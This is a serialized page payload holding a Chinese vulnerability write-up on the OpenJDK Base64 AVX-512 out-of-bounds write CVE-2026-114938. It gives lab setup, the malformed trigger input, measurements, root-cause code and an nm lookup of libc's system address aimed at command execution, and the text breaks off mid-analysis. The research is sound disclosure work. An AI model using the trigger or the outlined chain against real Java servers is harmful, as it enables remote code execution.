[{"_1":2,"_3":4},"root",{"_5":235},"routes/item",{"_5":6},"data",{"_7":8,"_9":10},"item",{"_11":12,"_13":14,"_15":16,"_17":18,"_19":20,"_21":22,"_23":24,"_25":26,"_27":28,"_29":28,"_30":31,"_32":33,"_34":35,"_36":37,"_38":39,"_40":41,"_42":-5,"_43":44,"_45":-5,"_46":47,"_48":49,"_50":51,"_52":53,"_54":37,"_55":37,"_56":57,"_58":59,"_60":61},"expiresAt",1795826452000,"id","t8wmzmfpiiphjiwm2e8ngw49n","title","OpenJDK CVE-2026-114938 AVX-512 越界写利用链与复现","originalTitle","利用AVX-512越界写漏洞CVE-2026-114938实现Java Base64解码远程代码执行","summary","OpenJDK CVE-2026-114938 可由 Base64 解码的 AVX-512 尾部路径整数下溢引发堆越界写，作者在 Temurin 21.0.13+9 上验证固定越界 62 字节，并完成堆内读写、任意原生读写、ASLR 绕过、桩槽覆写到命令执行。","reason","文章从 AVX-512 尾部路径的整数下溢切入，逐步验证堆越界写、原生内存读写、函数指针劫持与命令执行，并明确区分本地验证和远程利用尚缺的条件。","source",{"_73":234},"links",{"_220":233},"publishedAt","2026-11-19T05:08:10.000Z","discoveredAt","2026-11-20T06:19:32.370Z","timelineAt","category","disclosure","tags",[223,224,225,226,74,227,228,229,230,231,232],"score",87,"selected",true,"channel","news","story",{"_80":81,"_13":82},"x","readingMode","full","author","body",{"_61":219,"_220":-5,"_221":220,"_222":37},"outline",[83,84,85,86,87,88,89,90,91,92,93,94,95,96,97,98,99,100,101,102,103,104,105,106,107,108,109,110,111,112,113,114,115,116,117,118,119,120,121,122,123,124,125,126],"relatedStories",[79],"topics",[68,69,70],"indexable","markdownAvailable","group",{"_62":63,"_64":65,"_66":67},"hasTranslation",false,"bodyLanguage","zh","factId","fQSL_M6OIO54","reportCount",1,"additionalSourceCount",0,{"_71":77,"_73":78},{"_71":75,"_73":76},{"_71":72,"_73":74},"slug","research","name","技术研究","vuln","漏洞披露","oracle","Oracle / 甲骨文",{"_80":81,"_13":82},"publicId","8540cb70-bd3c-4700-8134-83f02bb49280","Java4Shell已出现利用尝试，Metabase受影响",{"_11":217,"_128":218,"_130":142},{"_11":215,"_128":216,"_130":142},{"_11":213,"_128":214,"_130":142},{"_11":211,"_128":212,"_130":142},{"_11":209,"_128":210,"_130":142},{"_11":207,"_128":208,"_130":142},{"_11":205,"_128":206,"_130":131},{"_11":203,"_128":204,"_130":131},{"_11":201,"_128":202,"_130":131},{"_11":199,"_128":200,"_130":131},{"_11":197,"_128":198,"_130":131},{"_11":195,"_128":196,"_130":142},{"_11":193,"_128":194,"_130":131},{"_11":191,"_128":192,"_130":131},{"_11":189,"_128":190,"_130":131},{"_11":187,"_128":188,"_130":131},{"_11":185,"_128":186,"_130":131},{"_11":183,"_128":184,"_130":131},{"_11":181,"_128":182,"_130":131},{"_11":179,"_128":180,"_130":131},{"_11":177,"_128":178,"_130":131},{"_11":175,"_128":176,"_130":131},{"_11":173,"_128":174,"_130":131},{"_11":171,"_128":172,"_130":142},{"_11":169,"_128":170,"_130":131},{"_11":167,"_128":168,"_130":131},{"_11":165,"_128":166,"_130":131},{"_11":163,"_128":164,"_130":131},{"_11":161,"_128":162,"_130":131},{"_11":159,"_128":160,"_130":131},{"_11":157,"_128":158,"_130":131},{"_11":155,"_128":156,"_130":131},{"_11":153,"_128":154,"_130":131},{"_11":151,"_128":152,"_130":131},{"_11":149,"_128":150,"_130":142},{"_11":147,"_128":148,"_130":131},{"_11":145,"_128":146,"_130":131},{"_11":143,"_128":144,"_130":142},{"_11":140,"_128":141,"_130":142},{"_11":138,"_128":139,"_130":131},{"_11":136,"_128":137,"_130":131},{"_11":134,"_128":135,"_130":131},{"_11":132,"_128":133,"_130":131},{"_11":127,"_128":129,"_130":131},"sec-44","text","附录 E：Chain29.java（预热写方法正例——预热后写入成功）","level",3,"sec-43","附录 D：Chain28.java（预热写方法反例——不预热，崩溃）","sec-42","附录 C：Corrupt2.java（正数 length + 堆内相对读写）","sec-41","附录 B：One.java（独立 JVM 基线）","sec-40","附录 A：Measure.java（基线测量）","sec-39","附：相关代码",2,"sec-38","参考","sec-37","2、临时缓解","sec-36","1、安全更新","sec-35","九、修复措施","sec-34","10、本文范围边界","sec-33","9、修复版本对比","sec-32","8、换任意命令","sec-31","7、完整利用输出","sec-30","6、触发——新的 decode 调用点","sec-29","5、覆写桩槽为 system","sec-28","4、绕过 ASLR","sec-27","3、劫持 DirectByteBuffer——任意原生读写","sec-26","2、预热写方法——绕过解释器的 klass 解引用","sec-25","1、正数 length","sec-24","八、漏洞复现——从越界写到命令执行","sec-23","拓展 / 举一反三","sec-22","调用链","sec-21","根因","sec-20","8、写入之后","sec-19","7、桩槽——本文选的劫持目标","sec-18","6、写入图样为什么固定","sec-17","5、越界量恒为 62 的代数证明","sec-16","4、掩码计算和越界写","sec-15","3、桩的尾部路径","sec-14","2、intrinsic 调用","sec-13","1、Java 侧入口","sec-12","七、漏洞分析","sec-11","5、对照组","sec-10","4、基线测量","sec-9","3、验证前置条件","sec-8","2、下载 JDK","sec-7","1、环境拓扑","sec-6","六、环境搭建","sec-5","五、利用条件","sec-4","四、影响组件","sec-3","三、受影响版本","sec-2","二、基本信息","sec-1","一、漏洞说明","<h2 id=\"sec-1\">一、漏洞说明</h2><p>Advisory：<a href=\"https://openjdk.org/groups/vulnerability/advisories/2026-11-17\">https://openjdk.org/groups/vulnerability/advisories/2026-11-17</a></p><p>该漏洞由安全公司 Calif 发现并披露。OpenJDK 的风险矩阵把 CVE-2026-114938 标在 hotspot/compiler，CVSS 3.1 为 8.1；NVD 给出的 CVSS 4.0 为 9.2（Critical），两个数字来自不同评估方和评分版本。受影响的是 OpenJDK 17.0.6 及以上、21、25、27 四条线的当年发行版；Oracle CPU 对 Oracle Java SE 8u511 也标了受影响。修复版本是 17.0.21.1、21.0.13.1、25.0.5.1、27.0.1.1。硬件要求 CPU 同时有 <code>avx512f</code>、<code>avx512bw</code>、<code>avx512vbmi</code>、<code>bmi2</code>——Intel Xeon Ice Lake/Sapphire Rapids/Emerald Rapids/Granite Rapids，AMD EPYC/Ryzen Zen 4 及更新；ARM64 不受影响。</p><p>解码的 Java 入口在 <code>java.util.Base64.Decoder</code>。<code>decode(byte[], byte[])</code> 先问 <code>decodedOutLength()</code> 要长度，数组不够大直接抛异常，够大才进 <code>decode0()</code>。<code>decode0()</code> 把成块的输入交给 <code>decodeBlock()</code>——这个方法标了 <code>@IntrinsicCandidate</code>，x86-64 上有 AVX-512 VBMI 时替换为 <code>StubGenerator::generate_base64_decodeBlock()</code> 生成的汇编桩。</p><p>桩里先按 64 字节一轮的循环处理主体，剩下不到 64 字节进尾部路径。尾部路径里 <code>output_size</code> 按 <code>(length &gt;&gt; 2) * 3</code> 估算，末尾是 <code>=</code> 再减 1。输入 128 个 <code>A</code> 加一个 <code>=</code> 时，两轮循环各写 48 字节，<code>length</code> 剩 1（那个 <code>=</code>），<code>(1 &gt;&gt; 2) * 3 = 0</code>，减 1 后 <code>output_size = -1</code>。紧接着的 <code>bzhi</code> 用 <code>output_size</code> 做下标决定掩码哪些位保留。<code>-1</code> 的低 8 位是 255，不少于操作数宽度，目的寄存器保持源的全 1。全 1 掩码下 <code>evmovdqub</code> 把向量里 64 字节全部写出。96（循环已写）加 64（尾部写出）= 160，Java 分配的是 98。</p><h2 id=\"sec-2\">二、基本信息</h2><table><tbody><tr><td colspan=\"1\" rowspan=\"1\"><p>公开时间</p></td><td colspan=\"1\" rowspan=\"1\"><p>2026-11-17</p></td></tr><tr><td colspan=\"1\" rowspan=\"1\"><p>编号</p></td><td colspan=\"1\" rowspan=\"1\"><p>CVE-2026-114938</p></td></tr><tr><td colspan=\"1\" rowspan=\"1\"><p>威胁类型</p></td><td colspan=\"1\" rowspan=\"1\"><p>堆越界写 → 任意代码执行</p></td></tr><tr><td colspan=\"1\" rowspan=\"1\"><p>CVSS 3.1</p></td><td colspan=\"1\" rowspan=\"1\"><p>8.1（OpenJDK 矩阵，hotspot/compiler）</p></td></tr><tr><td colspan=\"1\" rowspan=\"1\"><p>CVSS 4.0</p></td><td colspan=\"1\" rowspan=\"1\"><p>9.2 Critical（NVD）</p></td></tr><tr><td colspan=\"1\" rowspan=\"1\"><p>发现方</p></td><td colspan=\"1\" rowspan=\"1\"><p>Calif</p></td></tr><tr><td colspan=\"1\" rowspan=\"1\"><p>利用条件</p></td><td colspan=\"1\" rowspan=\"1\"><p>CPU 带 AVX-512 VBMI；不可信输入进到 <code>java.util.Base64</code></p></td></tr><tr><td colspan=\"1\" rowspan=\"1\"><p>修复 commit</p></td><td colspan=\"1\" rowspan=\"1\"><p>21u <code>8e115fb5</code></p></td></tr></tbody></table><h2 id=\"sec-3\">三、受影响版本</h2><ul><li><p>OpenJDK 17.0.6 ≤ v ≤ 17.0.21.0.3（修复于 17.0.21.1）</p></li><li><p>OpenJDK 21.0.1 ≤ v ≤ 21.0.13.0.3（修复于 21.0.13.1）</p></li><li><p>OpenJDK 25.0.1 ≤ v ≤ 25.0.5.0.3（修复于 25.0.5.1）</p></li><li><p>OpenJDK 27.0.1 ≤ v ≤ 27.0.1.0.3（修复于 27.0.1.1）</p></li><li><p>Oracle Java SE 8u511 也被 Oracle CPU 标为受影响</p></li></ul><p>硬件门槛：CPU 必须同时有 <code>avx512f</code> + <code>avx512bw</code> + <code>avx512vbmi</code> + <code>bmi2</code>。没有 VBMI 的 CPU 不走这段桩。ARM64 架构不受影响。本文跑的是 Temurin 21.0.13+9</p><h2 id=\"sec-4\">四、影响组件</h2><p><code>java.util.Base64</code> 是 JDK 标准库，任何 Java 程序都可能用到。以下路径在验证身份之前就会调它，不可信输入直接进到漏洞函数：</p><ul><li><p>HTTP Basic 认证（<code>Authorization: Basic &lt;base64&gt;</code> 解码）</p></li><li><p>JWT 的 header 和 payload 解码</p></li><li><p>SASL 机制</p></li><li><p>各类 API 网关的反向代理 Base64 透传</p></li></ul><p>安全公司 Wiz 已声明针对 Jenkins、Confluence、Apache Tomcat 的远程利用可行。CISA 已发紧急修复通告。已有公开的分阶段 PoC 工具包（ikow/java4shell-poc，含堆布局控制 Stage 1~5），其 README 自述利用难度为「Complex (heap feng shui)」，终点多为信息泄露或检测。从堆越界写到稳定代码执行的最后一步——具体的函数指针劫持路径——公开材料里没有给出。</p><h2 id=\"sec-5\">五、利用条件</h2><ol><li><p>服务端用 <code>java.util.Base64.getDecoder().decode()</code> 处理不可信输入</p></li><li><p>JDK 21.0.13.0.3 或更早的 21 线（或其他受影响线）</p></li><li><p>服务器 CPU 带 AVX-512 VBMI</p></li><li><p>C2 已编译过 <code>decodeBlock</code> 调用点</p></li></ol><h2 id=\"sec-6\">六、环境搭建</h2><h3 id=\"sec-7\">1、环境拓扑</h3><pre><code>本机 192.168.102.130（Ubuntu 22.04，CPU 带 avx512f/bw/vbmi/bmi2）\n├── ~/vuln/base64-lab/jdk21/       Temurin 21.0.13+9（漏洞版）\n└── ~/vuln/base64-lab/lab/</code></pre><p><img src=\"/api/img-proxy?u=https%3A%2F%2Fxzfile.aliyuncs.com%2Fmedia%2Fupload%2Fpicture%2F20261119131515-3462086d-e3d8-1.png&amp;mode=full&amp;exp=1796083200&amp;sig=df74b2285d3aca61\" srcset=\"/api/img-proxy?u=https%3A%2F%2Fxzfile.aliyuncs.com%2Fmedia%2Fupload%2Fpicture%2F20261119131515-3462086d-e3d8-1.png&amp;mode=thumb&amp;exp=1796083200&amp;sig=4b2ab762d7e9de9b 720w, /api/img-proxy?u=https%3A%2F%2Fxzfile.aliyuncs.com%2Fmedia%2Fupload%2Fpicture%2F20261119131515-3462086d-e3d8-1.png&amp;mode=image-1200&amp;exp=1796083200&amp;sig=f9ac833a80c7cdc5 1200w, /api/img-proxy?u=https%3A%2F%2Fxzfile.aliyuncs.com%2Fmedia%2Fupload%2Fpicture%2F20261119131515-3462086d-e3d8-1.png&amp;mode=full&amp;exp=1796083200&amp;sig=df74b2285d3aca61 1600w\" sizes=\"(min-width: 1536px) 760px, (min-width: 1024px) calc(100vw - 524px), (min-width: 640px) 608px, calc(100vw - 32px)\" loading=\"lazy\" decoding=\"async\" width=\"804\" height=\"296\"></p><h3 id=\"sec-8\">2、下载 JDK</h3><pre><code>mkdir -p ~/vuln/base64-lab &amp;&amp; cd ~/vuln/base64-lab\ncurl -sL -o jdk21.tar.gz \\\n  \"https://api.adoptium.net/v3/binary/latest/21/ga/linux/x64/jdk/hotspot/normal/eclipse\"\ntar -xzf jdk21.tar.gz\nmv jdk-21.0.13+9 jdk21</code></pre><h3 id=\"sec-9\">3、验证前置条件</h3><pre><code>jdk21/bin/java -version\n# openjdk version \"21.0.13\" ... Temurin-21.0.13+9\n\ngrep -o \"avx512f\\|avx512bw\\|avx512vbmi\\|bmi2\" /proc/cpuinfo | sort -u\n# 四行都必须出现\n\nnm -D /lib/x86_64-linux-gnu/libc.so.6 | grep -w system\n# 0000000000050d00 W system@@GLIBC_2.2.5\n\nnm jdk21/lib/server/libjvm.so | grep _base64_decodeBlock\n# 000000000158daf0 b _ZN12StubRoutines19_base64_decodeBlockE</code></pre><p><img src=\"/api/img-proxy?u=https%3A%2F%2Fxzfile.aliyuncs.com%2Fmedia%2Fupload%2Fpicture%2F20261119131516-34b772aa-e3d8-1.png&amp;mode=full&amp;exp=1796083200&amp;sig=39f02da25a7742fc\" srcset=\"/api/img-proxy?u=https%3A%2F%2Fxzfile.aliyuncs.com%2Fmedia%2Fupload%2Fpicture%2F20261119131516-34b772aa-e3d8-1.png&amp;mode=thumb&amp;exp=1796083200&amp;sig=0bcbc291659a0c73 720w, /api/img-proxy?u=https%3A%2F%2Fxzfile.aliyuncs.com%2Fmedia%2Fupload%2Fpicture%2F20261119131516-34b772aa-e3d8-1.png&amp;mode=image-1200&amp;exp=1796083200&amp;sig=8b88df3ad6356ab6 1200w, /api/img-proxy?u=https%3A%2F%2Fxzfile.aliyuncs.com%2Fmedia%2Fupload%2Fpicture%2F20261119131516-34b772aa-e3d8-1.png&amp;mode=full&amp;exp=1796083200&amp;sig=39f02da25a7742fc 1600w\" sizes=\"(min-width: 1536px) 760px, (min-width: 1024px) calc(100vw - 524px), (min-width: 640px) 608px, calc(100vw - 32px)\" loading=\"lazy\" decoding=\"async\" width=\"806\" height=\"278\"></p><h3 id=\"sec-10\">4、基线测量</h3><pre><code>jdk21/bin/java -cp lab Measure</code></pre><p>输出：</p><pre><code>case=128A+eq\nsrc.length=129\nexact=98\ndecode=IAE\nbytes_written=160\npast_end=62\naround_end=000069a6|9a69a69a69a69a69a69a69a69a69a69a\n\ncase=64A+eq\nsrc.length=65\nexact=50\ndecode=IAE\nbytes_written=48\npast_end=-2\naround_end=0000eeee|eeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee</code></pre><p><img src=\"/api/img-proxy?u=https%3A%2F%2Fxzfile.aliyuncs.com%2Fmedia%2Fupload%2Fpicture%2F20261119131516-34fe97e5-e3d8-1.png&amp;mode=full&amp;exp=1796083200&amp;sig=e47c853884d747f7\" srcset=\"/api/img-proxy?u=https%3A%2F%2Fxzfile.aliyuncs.com%2Fmedia%2Fupload%2Fpicture%2F20261119131516-34fe97e5-e3d8-1.png&amp;mode=thumb&amp;exp=1796083200&amp;sig=634f1aa78da60342 720w, /api/img-proxy?u=https%3A%2F%2Fxzfile.aliyuncs.com%2Fmedia%2Fupload%2Fpicture%2F20261119131516-34fe97e5-e3d8-1.png&amp;mode=image-1200&amp;exp=1796083200&amp;sig=d50f3bfb580cec90 1200w, /api/img-proxy?u=https%3A%2F%2Fxzfile.aliyuncs.com%2Fmedia%2Fupload%2Fpicture%2F20261119131516-34fe97e5-e3d8-1.png&amp;mode=full&amp;exp=1796083200&amp;sig=e47c853884d747f7 1600w\" sizes=\"(min-width: 1536px) 760px, (min-width: 1024px) calc(100vw - 524px), (min-width: 640px) 608px, calc(100vw - 32px)\" loading=\"lazy\" decoding=\"async\" width=\"806\" height=\"314\"></p><p>128A+= 写了 160 字节（越界 62）。但 64A+= 在同一 JVM 里只写了 48 字节、没越界——因为 128A+= 先抛的 IAE 把调用点<strong>去优化</strong>了（首次畸形输入后 JIT 丢弃编译产物，回退到解释器安全路径）。这是 JIT 的正常行为，不是漏洞不在。</p><p>用 One.java 把每个用例放在独立 JVM 里跑（消除去优化影响）：</p><p><img src=\"/api/img-proxy?u=https%3A%2F%2Fxzfile.aliyuncs.com%2Fmedia%2Fupload%2Fpicture%2F20261119131517-3539d775-e3d8-1.png&amp;mode=full&amp;exp=1796083200&amp;sig=f28da3f8fecbe624\" loading=\"lazy\" decoding=\"async\" width=\"639.3333333333334\"></p><p>两个用例在独立 JVM 里越界量都是 62</p><h3 id=\"sec-11\">5、对照组</h3><p>修复源码已在 GitHub tag <code>jdk-21.0.13.1-ga</code> 上确认，其行为是让短尾部走 Java 安全路径。禁用 intrinsic（<code>-XX:-UseBASE64Intrinsics</code>）后同样走 Java 路径处理，两者对短尾部的处理逻辑等价（注意：禁用 intrinsic 是全量走 Java 路径，修复版只让 <code>length &lt; 4</code> 的短尾部走 <code>L_bruteForce</code>，其余仍走 intrinsic——但就本文的触发形态而言，两者都使越界不再发生）。</p><table><tbody><tr><td colspan=\"1\" rowspan=\"1\"></td><td colspan=\"1\" rowspan=\"1\"><p>漏洞版 21.0.13（独立 JVM）</p></td><td colspan=\"1\" rowspan=\"1\"><p>关 intrinsic</p></td><td colspan=\"1\" rowspan=\"1\"><p>UseAVX=2</p></td></tr><tr><td colspan=\"1\" rowspan=\"1\"><p>128A+= 写入</p></td><td colspan=\"1\" rowspan=\"1\"><p>160</p></td><td colspan=\"1\" rowspan=\"1\"><p>96</p></td><td colspan=\"1\" rowspan=\"1\"><p>96</p></td></tr><tr><td colspan=\"1\" rowspan=\"1\"><p>128A+= 越界</p></td><td colspan=\"1\" rowspan=\"1\"><p>62</p></td><td colspan=\"1\" rowspan=\"1\"><p>-2（未越）</p></td><td colspan=\"1\" rowspan=\"1\"><p>-2（未越）</p></td></tr><tr><td colspan=\"1\" rowspan=\"1\"><p>64A+= 写入</p></td><td colspan=\"1\" rowspan=\"1\"><p>112</p></td><td colspan=\"1\" rowspan=\"1\"><p>48</p></td><td colspan=\"1\" rowspan=\"1\"><p>48</p></td></tr><tr><td colspan=\"1\" rowspan=\"1\"><p>64A+= 越界</p></td><td colspan=\"1\" rowspan=\"1\"><p>62</p></td><td colspan=\"1\" rowspan=\"1\"><p>-2（未越）</p></td><td colspan=\"1\" rowspan=\"1\"><p>-2（未越）</p></td></tr></tbody></table><h2 id=\"sec-12\">七、漏洞分析</h2><h3 id=\"sec-13\">1、Java 侧入口</h3><p><code>src/java.base/share/classes/java/util/Base64.java</code>，tag <code>jdk-21.0.13-ga</code></p><pre><code>/* Base64.java:622 */\npublic int decode(byte[] src, byte[] dst) {\n    int len = decodedOutLength(src, 0, src.length);\n    if (dst.length &lt; len || len == -1)\n        throw new IllegalArgumentException(\n            \"Output byte array is too small for decoding all input bytes\");\n    return decode0(src, 0, src.length, dst);\n}</code></pre><p><img src=\"/api/img-proxy?u=https%3A%2F%2Fxzfile.aliyuncs.com%2Fmedia%2Fupload%2Fpicture%2F20261119131517-359f6c63-e3d8-1.png&amp;mode=full&amp;exp=1796083200&amp;sig=bfd68d156d587a09\" srcset=\"/api/img-proxy?u=https%3A%2F%2Fxzfile.aliyuncs.com%2Fmedia%2Fupload%2Fpicture%2F20261119131517-359f6c63-e3d8-1.png&amp;mode=thumb&amp;exp=1796083200&amp;sig=eda2341e687b5152 720w, /api/img-proxy?u=https%3A%2F%2Fxzfile.aliyuncs.com%2Fmedia%2Fupload%2Fpicture%2F20261119131517-359f6c63-e3d8-1.png&amp;mode=image-1200&amp;exp=1796083200&amp;sig=18793fe8e450aad7 1200w, /api/img-proxy?u=https%3A%2F%2Fxzfile.aliyuncs.com%2Fmedia%2Fupload%2Fpicture%2F20261119131517-359f6c63-e3d8-1.png&amp;mode=full&amp;exp=1796083200&amp;sig=bfd68d156d587a09 1600w\" sizes=\"(min-width: 1536px) 760px, (min-width: 1024px) calc(100vw - 524px), (min-width: 640px) 608px, calc(100vw - 32px)\" loading=\"lazy\" decoding=\"async\" width=\"1706\" height=\"898\"></p><p><code>decodedOutLength()</code> 在第 745 行收成 <code>3 * ((len + 3) / 4) - paddings</code>。</p><p><img src=\"/api/img-proxy?u=https%3A%2F%2Fxzfile.aliyuncs.com%2Fmedia%2Fupload%2Fpicture%2F20261119131518-361c7843-e3d8-1.png&amp;mode=full&amp;exp=1796083200&amp;sig=1729ff801588fd62\" srcset=\"/api/img-proxy?u=https%3A%2F%2Fxzfile.aliyuncs.com%2Fmedia%2Fupload%2Fpicture%2F20261119131518-361c7843-e3d8-1.png&amp;mode=thumb&amp;exp=1796083200&amp;sig=d5ca28b2f16b107a 720w, /api/img-proxy?u=https%3A%2F%2Fxzfile.aliyuncs.com%2Fmedia%2Fupload%2Fpicture%2F20261119131518-361c7843-e3d8-1.png&amp;mode=image-1200&amp;exp=1796083200&amp;sig=864a7d2c922f26bb 1200w, /api/img-proxy?u=https%3A%2F%2Fxzfile.aliyuncs.com%2Fmedia%2Fupload%2Fpicture%2F20261119131518-361c7843-e3d8-1.png&amp;mode=full&amp;exp=1796083200&amp;sig=1729ff801588fd62 1600w\" sizes=\"(min-width: 1536px) 760px, (min-width: 1024px) calc(100vw - 524px), (min-width: 640px) 608px, calc(100vw - 32px)\" loading=\"lazy\" decoding=\"async\" width=\"1706\" height=\"898\"></p><h3 id=\"sec-14\">2、intrinsic 调用</h3><pre><code>/* Base64.java:818 */\nint dl = decodeBlock(src, sp, sl, dst, dp, isURL, isMIME);</code></pre><p><img src=\"/api/img-proxy?u=https%3A%2F%2Fxzfile.aliyuncs.com%2Fmedia%2Fupload%2Fpicture%2F20261119131519-368e57b3-e3d8-1.png&amp;mode=full&amp;exp=1796083200&amp;sig=b3a042a8cf3e0773\" srcset=\"/api/img-proxy?u=https%3A%2F%2Fxzfile.aliyuncs.com%2Fmedia%2Fupload%2Fpicture%2F20261119131519-368e57b3-e3d8-1.png&amp;mode=thumb&amp;exp=1796083200&amp;sig=7b70d143013dc79b 720w, /api/img-proxy?u=https%3A%2F%2Fxzfile.aliyuncs.com%2Fmedia%2Fupload%2Fpicture%2F20261119131519-368e57b3-e3d8-1.png&amp;mode=image-1200&amp;exp=1796083200&amp;sig=f8d2cba0d560b36d 1200w, /api/img-proxy?u=https%3A%2F%2Fxzfile.aliyuncs.com%2Fmedia%2Fupload%2Fpicture%2F20261119131519-368e57b3-e3d8-1.png&amp;mode=full&amp;exp=1796083200&amp;sig=b3a042a8cf3e0773 1600w\" sizes=\"(min-width: 1536px) 760px, (min-width: 1024px) calc(100vw - 524px), (min-width: 640px) 608px, calc(100vw - 32px)\" loading=\"lazy\" decoding=\"async\" width=\"1706\" height=\"898\"></p><p><code>decodeBlock</code> 标了 <code>@IntrinsicCandidate</code>，C2 编译时替换为对 <code>StubRoutines::_base64_decodeBlock</code> 的直接调用。</p><p><img src=\"/api/img-proxy?u=https%3A%2F%2Fxzfile.aliyuncs.com%2Fmedia%2Fupload%2Fpicture%2F20261119131519-36dcce2a-e3d8-1.png&amp;mode=full&amp;exp=1796083200&amp;sig=47d154bc9667aa0a\" srcset=\"/api/img-proxy?u=https%3A%2F%2Fxzfile.aliyuncs.com%2Fmedia%2Fupload%2Fpicture%2F20261119131519-36dcce2a-e3d8-1.png&amp;mode=thumb&amp;exp=1796083200&amp;sig=c9296fd327a5c916 720w, /api/img-proxy?u=https%3A%2F%2Fxzfile.aliyuncs.com%2Fmedia%2Fupload%2Fpicture%2F20261119131519-36dcce2a-e3d8-1.png&amp;mode=image-1200&amp;exp=1796083200&amp;sig=2cb3d64a6b67e38b 1200w, /api/img-proxy?u=https%3A%2F%2Fxzfile.aliyuncs.com%2Fmedia%2Fupload%2Fpicture%2F20261119131519-36dcce2a-e3d8-1.png&amp;mode=full&amp;exp=1796083200&amp;sig=47d154bc9667aa0a 1600w\" sizes=\"(min-width: 1536px) 760px, (min-width: 1024px) calc(100vw - 524px), (min-width: 640px) 608px, calc(100vw - 32px)\" loading=\"lazy\" decoding=\"async\" width=\"1336\" height=\"454\"></p><h3 id=\"sec-15\">3、桩的尾部路径</h3><p><code>src/hotspot/cpu/x86/stubGenerator_x86_64.cpp</code>，tag <code>jdk-21.0.13-ga</code></p><pre><code>/* stubGenerator_x86_64.cpp:2543 起 */\n__ movl(output_size, length);\n__ shrl(output_size, 2);\n__ lea(output_size, Address(output_size, output_size, Address::times_2, 0));\n__ cmpb(Address(source, length, Address::times_1, -1), '=');\n__ jcc(Assembler::equal, L_padding);\n// ...\n__ BIND(L_padding);\n__ decrementq(output_size, 1);</code></pre><p><img src=\"/api/img-proxy?u=https%3A%2F%2Fxzfile.aliyuncs.com%2Fmedia%2Fupload%2Fpicture%2F20261119131520-3745a2e6-e3d8-1.png&amp;mode=full&amp;exp=1796083200&amp;sig=e100315b47e84ff3\" srcset=\"/api/img-proxy?u=https%3A%2F%2Fxzfile.aliyuncs.com%2Fmedia%2Fupload%2Fpicture%2F20261119131520-3745a2e6-e3d8-1.png&amp;mode=thumb&amp;exp=1796083200&amp;sig=2183eb17563b9162 720w, /api/img-proxy?u=https%3A%2F%2Fxzfile.aliyuncs.com%2Fmedia%2Fupload%2Fpicture%2F20261119131520-3745a2e6-e3d8-1.png&amp;mode=image-1200&amp;exp=1796083200&amp;sig=e3f589d6706aafec 1200w, /api/img-proxy?u=https%3A%2F%2Fxzfile.aliyuncs.com%2Fmedia%2Fupload%2Fpicture%2F20261119131520-3745a2e6-e3d8-1.png&amp;mode=full&amp;exp=1796083200&amp;sig=e100315b47e84ff3 1600w\" sizes=\"(min-width: 1536px) 760px, (min-width: 1024px) calc(100vw - 524px), (min-width: 640px) 608px, calc(100vw - 32px)\" loading=\"lazy\" decoding=\"async\" width=\"1706\" height=\"898\"></p><h3 id=\"sec-16\">4、掩码计算和越界写</h3><pre><code>/* stubGenerator_x86_64.cpp:2559 */\n__ bzhiq(output_mask, output_mask, output_size);\n__ kmovql(k1, output_mask);\n__ evmovdqub(Address(dest, dp), k1, tmp, true, Assembler::AVX_512bit);</code></pre><p><img src=\"/api/img-proxy?u=https%3A%2F%2Fxzfile.aliyuncs.com%2Fmedia%2Fupload%2Fpicture%2F20261119131521-37b8afc3-e3d8-1.png&amp;mode=full&amp;exp=1796083200&amp;sig=da510b4ae615fec2\" srcset=\"/api/img-proxy?u=https%3A%2F%2Fxzfile.aliyuncs.com%2Fmedia%2Fupload%2Fpicture%2F20261119131521-37b8afc3-e3d8-1.png&amp;mode=thumb&amp;exp=1796083200&amp;sig=6faa06bac25ad92b 720w, /api/img-proxy?u=https%3A%2F%2Fxzfile.aliyuncs.com%2Fmedia%2Fupload%2Fpicture%2F20261119131521-37b8afc3-e3d8-1.png&amp;mode=image-1200&amp;exp=1796083200&amp;sig=54cce366142128bc 1200w, /api/img-proxy?u=https%3A%2F%2Fxzfile.aliyuncs.com%2Fmedia%2Fupload%2Fpicture%2F20261119131521-37b8afc3-e3d8-1.png&amp;mode=full&amp;exp=1796083200&amp;sig=da510b4ae615fec2 1600w\" sizes=\"(min-width: 1536px) 760px, (min-width: 1024px) calc(100vw - 524px), (min-width: 640px) 608px, calc(100vw - 32px)\" loading=\"lazy\" decoding=\"async\" width=\"1706\" height=\"898\"></p><p><code>bzhi</code> 用 <code>output_size</code> 做下标。<code>output_size = -1</code> 时低 8 位是 255 ≥ 64，掩码保持全 1。<code>evmovdqub</code> 在全 1 掩码下写出完整 64 字节。</p><h3 id=\"sec-17\">5、越界量恒为 62 的代数证明</h3><p>设输入为 64k 个 <code>A</code> + 1 个 <code>=</code>（长度 N = 64k + 1）。</p><p><strong>Java 侧分配：</strong></p><pre><code>exact = 3 * ((N + 3) / 4) - 1\n      = 3 * ((64k + 4) / 4) - 1\n      = 3 * (16k + 1) - 1\n      = 48k + 3 - 1\n      = 48k + 2</code></pre><p><strong>桩侧实际写入：</strong></p><ul><li><p>k 轮 <code>L_process64Loop</code> 循环，每轮写 48 字节 → dp = 48k</p></li><li><p><code>length</code> 剩 1（那个 <code>=</code>），进尾部路径</p></li><li><p><code>(1 &gt;&gt; 2) * 3 = 0</code>，减 1 → <code>output_size = -1</code></p></li><li><p><code>bzhi</code> 全 1 掩码 → <code>evmovdqub</code> 写满 64 字节</p></li><li><p>总写入 = 48k + 64</p></li></ul><p><strong>越界量：</strong></p><pre><code>overflow = (48k + 64) - (48k + 2) = 62</code></pre><p>与 k 无关。k=1（64A+=）得 50/112，k=2（128A+=）得 98/160</p><h3 id=\"sec-18\">6、写入图样为什么固定</h3><p>第 2563 行事先把向量广播成 <code>0x61616161</code>（字符 <code>a</code>）。第 2585 行按输入掩码从源并字节，但此时输入掩码已被 <code>shrq(rax, 1)</code> 清成 0（第 2630 行），源里的字母进不来。后面的 <code>vpmaddubsw</code> / <code>vpermb</code> 洗的是这串 <code>a</code>。<code>aaaa</code> 的标准解码是 <code>69 a6 9a</code>，所以越界字节是 <code>69 a6 9a</code> 的循环、末尾 16 字节是 <code>9a</code>。输入能改的只是这段写入从哪个偏移开始（dp = 48k），改不了写入的内容。</p><p><img src=\"/api/img-proxy?u=https%3A%2F%2Fxzfile.aliyuncs.com%2Fmedia%2Fupload%2Fpicture%2F20261119131521-382a476a-e3d8-1.png&amp;mode=full&amp;exp=1796083200&amp;sig=cd60bf900dae37fb\" 